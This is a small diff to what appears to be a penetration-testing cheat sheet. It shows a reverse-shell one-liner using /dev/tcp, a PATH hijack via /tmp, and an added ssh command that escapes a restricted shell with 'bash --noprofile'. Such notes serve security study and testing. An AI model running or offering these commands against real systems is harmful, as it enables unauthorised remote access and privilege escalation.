@@ -34,9 +34,10 @@ echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the ec
 /proc/cpuinfo
 ```
 
-### PATH
+### PATH & Restricted Shell
 ```
 export PATH=/tmp:$PATH
+ssh alfred@10.11.1.101 -t "bash --noprofile"
 ```
 
 ### Docker
